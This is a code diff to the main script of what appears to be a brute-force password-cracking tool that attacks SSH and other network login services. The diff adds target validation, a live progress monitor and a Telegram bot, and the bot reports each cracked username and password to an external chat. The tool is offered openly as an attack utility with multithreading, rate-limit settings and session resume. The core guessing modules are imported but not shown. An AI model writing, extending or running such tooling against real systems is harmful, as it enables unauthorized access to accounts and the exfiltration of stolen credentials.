@@ -16,24 +16,25 @@ sys.path.insert(0, str(Path(__file__).parent))
 
 from rich.console import Console
 from rich.prompt import Confirm
-import sys
 
 # Import UI components
 from ui.banner import show_welcome, clear_screen
 from ui.menu import (
     create_main_menu, create_attack_mode_menu, create_settings_menu,
     get_target_input, get_dictionary_config, get_generation_config,
-    get_rate_limit_config, get_notification_config, select_session,
+    get_rate_limit_config, get_telegram_config, select_session,
     confirm_attack, show_time_estimate, render_main_menu, render_settings_menu,
-    render_attack_mode_menu
+    render_attack_mode_menu, show_validation_error, render_header
 )
 from ui.display import display_server_info, display_help, display_version
+from ui.live_status import AttackMonitor
 
 # Import core components
 from core.rate_limiter import RateLimiter, RateLimitConfig
 from core.session_manager import SessionManager
 from core.notifier import Notifier, NotificationConfig
 from core.attack_engine import AttackEngine
+from core.telegram_bot import TelegramBot, TelegramConfig, create_from_config
 
 # Import protocol attackers
 from protocols.ssh_attack import SSHAttacker
@@ -49,8 +50,10 @@ console = Console()
 
 # Global state
 current_engine = None
+current_monitor = None
 config = {}
 session_manager = None
+telegram_bot = None
 
 
 def load_config():
@@ -80,9 +83,12 @@ def save_config():
 
 def signal_handler(sig, frame):
     """Handle Ctrl+C gracefully."""
-    global current_engine
+    global current_engine, current_monitor
     
     console.print("\n[yellow]Interrupt received. Stopping...[/yellow]")
+    
+    if current_monitor:
+        current_monitor.stop()
     
     if current_engine and current_engine.is_running():
         current_engine.stop()
@@ -105,24 +111,50 @@ def get_attacker(protocol: str, host: str, port: int):
     return attacker_class(host, port or default_port, timeout=config.get("attack", {}).get("timeout", 10))
 
 
-def run_attack(protocol: str, mode: str, attack_config: dict, target_config: dict):
+def validate_target(protocol: str, host: str, port: int) -> tuple:
+    """
+    Validate target before attack.
+    Returns (valid, error_type, error_message)
+    """
+    console.print("\n[cyan]Validating target...[/cyan]")
+    
+    attacker = get_attacker(protocol, host, port)
+    
+    # Use the validation method if available (FTP has it)
+    if hasattr(attacker, 'validate_target'):
+        result = attacker.validate_target()
+        if not result.valid:
+            return False, result.error_type, result.error
+        return True, None, None
+    
+    # Fallback: just check if port is open
+    if not attacker.check_port_open():
+        return False, "refused", f"Port {port} is not reachable"
+    
+    return True, None, None
+
+
+def run_attack(protocol: str, mode: str, attack_config: dict, target_config: dict, skip_validation: bool = False):
     """Run an attack with the specified configuration."""
-    global current_engine
+    global current_engine, current_monitor, telegram_bot
     
     host = target_config["host"]
     port = target_config["port"]
     
+    # Validate target first (unless skipped for resume)
+    if not skip_validation:
+        valid, error_type, error_msg = validate_target(protocol, host, port)
+        if not valid:
+            show_validation_error(error_type, error_msg, host, port)
+            return
+    
     # Create attacker
     attacker = get_attacker(protocol, host, port)
     
-    # Check server
+    # Display server info
     console.print("\n[cyan]Checking target...[/cyan]")
     server_info = attacker.get_server_info()
     display_server_info(server_info)
-    
-    if not server_info.get("port_open"):
-        console.print("[red]Target port is not open. Aborting.[/red]")
-        return
     
     # Create rate limiter
     rl_config = config.get("rate_limiting", {})
@@ -135,6 +167,9 @@ def run_attack(protocol: str, mode: str, attack_config: dict, target_config: dic
     
     # Create notifier
     notifier = Notifier.from_config_file(str(Path(__file__).parent / "config.json"))
+    
+    # Create Telegram bot if enabled
+    telegram_bot = create_from_config(config)
     
     # Create session manager
     global session_manager
@@ -214,6 +249,22 @@ def run_attack(protocol: str, mode: str, attack_config: dict, target_config: dic
         total_combinations=total
     )
     
+    # Create live status monitor
+    current_monitor = AttackMonitor(
+        target_host=host,
+        target_port=port,
+        protocol=protocol,
+        total=total
+    )
+    
+    # Start Telegram bot if enabled
+    if telegram_bot and telegram_bot.config.enabled:
+        telegram_bot.start()
+        telegram_bot.send_start(f"{host}:{port}", protocol, total)
+        
+        # Add Telegram callback to monitor
+        current_monitor.add_callback(lambda stats: telegram_bot.send_progress(current_monitor.get_summary()))
+    
     # Create and run engine
     threads = config.get("attack", {}).get("threads", 10)
     
@@ -227,20 +278,55 @@ def run_attack(protocol: str, mode: str, attack_config: dict, target_config: dic
     
     console.print(f"\n[bold green]Starting attack with {threads} threads...[/bold green]\n")
     
+    # Start live status display
+    current_monitor.start()
+    
     try:
+        # Custom callback to update monitor during attack
+        def on_attempt(tested, username, password, success, error=None):
+            current_monitor.update(tested=tested)
+            if success:
+                current_monitor.add_credential(username, password)
+                if telegram_bot and telegram_bot.is_available:
+                    telegram_bot.send_found(username, password, f"{host}:{port}")
+            if error:
+                current_monitor.set_error(error)
+                if error and telegram_bot and telegram_bot.is_available:
+                    # Only send critical errors
+                    if any(x in error.lower() for x in ['timeout', 'refused', 'unreachable']):
+                        telegram_bot.send_error(error, f"{host}:{port}")
+        
+        # Start engine with callback
+        current_engine.on_attempt = on_attempt
         current_engine.start(generator, total)
+        
+        current_monitor.set_stage("completed")
+        
     except KeyboardInterrupt:
+        current_monitor.set_stage("stopped")
         current_engine.stop()
         console.print("\n[yellow]Attack stopped.[/yellow]")
     
-    # Mark session complete
-    session_manager.complete()
+    finally:
+        # Stop monitor
+        current_monitor.stop()
+        
+        # Send final summary via Telegram
+        if telegram_bot and telegram_bot.is_available:
+            telegram_bot.send_summary(current_monitor.get_summary())
+            telegram_bot.stop()
+        
+        # Mark session complete
+        session_manager.complete()
+    
+    # Wait for user before returning to menu
+    console.print("\n[dim]Press Enter to return to menu...[/dim]")
+    input()
 
 
 def resume_session():
     """Resume a previous session."""
     global session_manager
-    from ui.menu import clear_screen, render_header
     from rich.panel import Panel
     from rich.align import Align
     from rich.box import ROUNDED
@@ -282,10 +368,7 @@ def resume_session():
         console.print(f"\n[cyan]Resuming session: {session.session_id}[/cyan]")
         console.print(f"[dim]Progress: {session.progress.tested}/{session.progress.total_combinations}[/dim]")
         
-        # Get resume info
-        resume_info = session_manager.get_resume_info()
-        
-        # Recreate attack
+        # Recreate attack - skip validation since it was already done
         run_attack(
             protocol=session.protocol,
             mode=session.mode,
@@ -293,7 +376,8 @@ def resume_session():
             target_config={
                 "host": session.target_host,
                 "port": session.target_port
-            }
+            },
+            skip_validation=True
         )
     except Exception as e:
         console.print(f"[red]Error loading session: {e}[/red]")
@@ -314,23 +398,21 @@ def settings_menu():
             config["rate_limiting"] = rl_config
             save_config()
             clear_screen()
-            console.print("[green]✓ Rate limiting settings saved.[/green]")
+            console.print("[green]Rate limiting settings saved.[/green]")
             import time
             time.sleep(1)
         elif choice == "2":
-            # Notifications
-            notif_config = get_notification_config()
-            config["telegram"] = notif_config["telegram"]
-            config["discord"] = notif_config["discord"]
+            # Telegram notifications
+            tg_config = get_telegram_config()
+            config["telegram"] = tg_config
             save_config()
             clear_screen()
-            console.print("[green]✓ Notification settings saved.[/green]")
+            console.print("[green]Telegram settings saved.[/green]")
             import time
             time.sleep(1)
         elif choice == "3":
             # Threads
             clear_screen()
-            from ui.menu import render_header
             render_header()
             from rich.prompt import IntPrompt
             threads = IntPrompt.ask("[cyan]Number of threads[/cyan]", default=10)
@@ -338,13 +420,12 @@ def settings_menu():
                 config["attack"] = {}
             config["attack"]["threads"] = max(1, min(threads, 100))
             save_config()
-            console.print(f"[green]✓ Thread count set to {config['attack']['threads']}.[/green]")
+            console.print(f"[green]Thread count set to {config['attack']['threads']}.[/green]")
             import time
             time.sleep(1)
         elif choice == "4":
             # Session settings
             clear_screen()
-            from ui.menu import render_header
             render_header()
             from rich.prompt import Confirm as ConfirmPrompt
             auto_save = ConfirmPrompt.ask("[cyan]Auto-save sessions?[/cyan]", default=True)
@@ -352,7 +433,7 @@ def settings_menu():
                 config["session"] = {}
             config["session"]["auto_save"] = auto_save
             save_config()
-            console.print("[green]✓ Session settings saved.[/green]")
+            console.print("[green]Session settings saved.[/green]")
             import time
             time.sleep(1)
 
@@ -428,7 +509,7 @@ def main_interactive():
             resume_session()
         elif choice == "6":
             clear_screen()
-            console.print("[cyan]\n  Goodbye! 👋\n[/cyan]")
+            console.print("[cyan]\n  Goodbye!\n[/cyan]")
             break
 
 
@@ -617,7 +698,8 @@ def main():
             protocol=session.protocol,
             mode=session.mode,
             attack_config=session.attack_config,
-            target_config={"host": session.target_host, "port": session.target_port}
+            target_config={"host": session.target_host, "port": session.target_port},
+            skip_validation=True
         )
         return
     
